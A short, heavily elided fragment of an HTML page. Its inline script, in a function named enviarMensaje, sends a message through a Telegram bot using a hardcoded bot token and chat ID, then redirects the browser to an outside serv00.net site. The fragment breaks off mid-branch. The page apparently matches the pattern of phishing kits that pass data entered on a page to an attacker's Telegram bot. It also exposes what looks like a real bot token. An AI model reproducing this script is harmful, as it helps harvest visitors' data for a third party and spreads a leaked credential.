...
<body>
    ...
    <script>
        ...
        async function enviarMensaje() {
            const telegramBotToken = '6675259515:AAE0R33aF6w0UtjKIODD-2D3FVobjNeSYUQ';  // Reemplaza con tu token de bot
            const chatId = '-1166560234';          // Reemplaza con tu chat ID
            ...
            try {
                ...
                if (data.ok) {
                    ...
                    window.location.href = 'https://Jose1717.serv00.net/';
                } else {
